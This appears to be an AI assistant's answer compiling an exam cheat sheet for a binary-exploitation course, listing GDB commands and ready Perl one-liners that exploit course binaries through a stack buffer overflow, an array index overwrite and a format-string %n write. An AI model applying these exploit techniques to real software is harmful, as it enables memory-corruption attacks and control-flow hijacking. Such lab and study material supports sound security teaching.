Creating a cheat sheet of exam commands. Checking existing commands first:


[2 tools called]


## Exam cheat sheet — commands

### GDB basics

#### Starting and running
```bash
gdb ./program              # Start gdb with program
run                        # Run program
run <arg>                  # Run with argument
set args <arg1> <arg2>     # Set command-line arguments
continue (or c)            # Continue execution
stepi (or si)              # Step one instruction
nexti (or ni)              # Next instruction
```

#### Breakpoints
```bash
break <function_name>      # Break at function
break <line_number>       # Break at line number
break *<address>           # Break at memory address
clear                      # Clear all breakpoints
clear <line_number>       # Clear breakpoint at line
info breakpoints          # List all breakpoints
```

#### Stack and frame inspection
```bash
info frame                # Show current frame info (saved eip, ebp, etc.)
info stack                # Show call stack with all frames
info registers (or info reg)  # Show all registers
info reg ebp              # Show EBP register
info reg eip              # Show EIP register
x/1wx $ebp+4              # View return address (saved eip)
```

#### Memory inspection
```bash
x/<count><format><size> <address>  # Examine memory
x/10i <address>           # Disassemble 10 instructions
x/3bx <function>          # Show 3 bytes in hex at function
x/x <address>             # Show value at address in hex
x/s <address>             # Show as string
x/d <address>             # Show as decimal
disassemble <function>    # Disassemble function (or disas)
disassemble main          # Disassemble main function
```

#### Variable and address inspection
```bash
print <variable>          # Print variable value
print &<variable>         # Print variable address
print /d <value>          # Print as decimal
print /x <value>          # Print as hexadecimal
print /d 0x8048356        # Convert hex to decimal
p/d 0xffffd264-0xffffd318 # Calculate offset between addresses
```

#### Finding addresses
```bash
print &rating             # Find address of variable
print &magic              # Find address of variable
print function_name       # Find address of function
x/10i main                # See main function addresses
```

---

### Buffer overflow exploits (q2)

#### Finding target address
```bash
gdb ./q2
(gdb) disassemble main     # Find address of target instruction
# Look for the instruction that prints magic string
# Example: 0x080483ee (mov instruction before the call)
```

#### Testing offset
```bash
perl -e 'system "./q2", "A"x38 . "BBBB" . "CCCC"'
# Then check eip in gdb when it crashes
# If eip = 0x42424242, offset is 38 bytes
```

#### Final exploit
```bash
# Simple version:
perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'

# With pack:
perl -e 'system "./q2", "A"x38 . pack("V", 0x080483ee)'
```

---

### Array index overflow (q3)

#### Finding addresses and offset
```bash
gdb ./q3
(gdb) print &foo          # Find foo function address
(gdb) print /d 0x8048356  # Convert to decimal (for input)
(gdb) print &values       # Find array address
(gdb) info frame          # Find return address location
(gdb) p/d <return_addr> - <values_addr>  # Calculate offset
# Divide by 4 to get index (since int is 4 bytes)
```

#### Exploit (stdin input)
```bash
perl -e 'print "515 134513494\n-1 1\n"' | ./q3
# Format: <index> <value>\n-1 1\n
# index = offset/4, value = function address as decimal
```

---

### Format string vulnerability (q4)

#### Finding addresses
```bash
gdb ./q4
(gdb) print &rating       # Find rating variable address
# Example: 0x804b018
```

#### Finding stack position
```bash
# Test where input appears on stack:
perl -e 'system "./q4", "AAAA" . "%x.%x.%x.%x.%x.%x.%x.%x"'
# Look for 41414141 (AAAA in hex) in output
# Count position (1st, 2nd, 3rd, etc.) = stack position
```

#### Exploit
```bash
perl -e 'system "./q4", pack("V", 0x804b018) . "%995d%5\$n"'
# Format: [address] + "%<padding>d%<position>$n"
# padding = 999 - address_bytes - " has a rating: " length
# position = where input appears on stack (from test above)
```

---

### Perl commands

#### Basic syntax
```bash
perl -e 'system "./program", "arg1", "arg2"'  # Command-line args
perl -e 'print "input\n"' | ./program          # stdin input
```

#### Pack function (for addresses)
```bash
pack("V", 0x080483ee)     # Convert address to little-endian bytes
# "V" = 32-bit unsigned little-endian
```

#### String repetition
```bash
"A"x38                    # 38 'A' characters
"A"x42 . "\xee\x83\x04\x08"  # Concatenation
```

#### Special characters
```bash
"\xee\x83\x04\x08"        # Hex bytes (little-endian address)
"\n"                      # Newline
"%5\$n"                   # Escaped $ for format string (use in single quotes)
```

---

### Useful calculations

#### Offset calculations
```bash
# In gdb:
p/d <address1> - <address2>     # Calculate byte difference
# Divide by 4 for int array index
# Divide by 1 for char array index
```

#### Character counting
```bash
echo -n "string" | wc -c         # Count characters
perl -e 'print length("string")' # Count characters
```

#### Address conversions
```bash
# In gdb:
print /d 0x8048356        # Hex to decimal
print /x 134513494       # Decimal to hex
```

---

### Quick reference by question type

#### Stack analysis (q1)
```bash
break <function>
run <arg>
info frame              # Get saved eip, ebp addresses
info stack              # See all stack frames
info reg ebp            # Get EBP value
p/d <addr1> - <addr2>   # Calculate offset
```

#### Buffer overflow (q2)
```bash
disassemble main        # Find target address
# Test offset with "A"xN . "BBBB"
perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'
```

#### Array overflow (q3)
```bash
print &foo
print /d <foo_address>
print &values
p/d <return_addr> - <values_addr>
perl -e 'print "<index> <value>\n-1 1\n"' | ./q3
```

#### Format string (q4)
```bash
print &rating
# Test: perl -e 'system "./q4", "AAAA" . "%x%x%x%x%x"'
perl -e 'system "./q4", pack("V", 0x804b018) . "%995d%5\$n"'
```

---

### Common patterns

#### Finding return address location
```bash
info frame
# Look for: "saved eip at 0x..."
x/1wx $ebp+4            # Usually return address is at EBP+4
```

#### Testing buffer overflow offset
```bash
perl -e 'system "./prog", "A"xN . "BBBB"'
# Check eip when crashes - if 0x42424242, offset = N
```

#### Format string position finding
```bash
perl -e 'system "./prog", "AAAA" . "%x%x%x%x%x"'
# Look for 41414141 in output = position number
```

---

### Tips

1. Always use `info frame` to see stack layout
2. Little-endian: addresses are reversed (`0x080483ee` = `\xee\x83\x04\x08`)
3. Array index = byte offset / sizeof(element)
4. Format string: `%n` writes count, `%x` reads from stack
5. Test offsets incrementally (38, 40, 42, etc.)
6. Use `pack("V", address)` for reliable address formatting

This covers the main commands for the exam.